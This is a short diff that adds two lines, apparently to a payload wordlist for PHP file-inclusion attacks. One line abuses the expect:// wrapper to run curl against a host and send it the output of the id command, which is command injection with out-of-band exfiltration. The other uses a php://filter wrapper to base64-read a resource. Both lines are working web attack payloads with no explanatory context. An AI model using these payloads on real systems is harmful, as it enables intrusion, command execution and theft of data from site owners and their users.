@@ -1,0 +1,2 @@
+expect://curl http://target.com/r/w8rpj9w8?a=$(id)
+php://filter/read=convert.base64-encode/resource=http://target.com
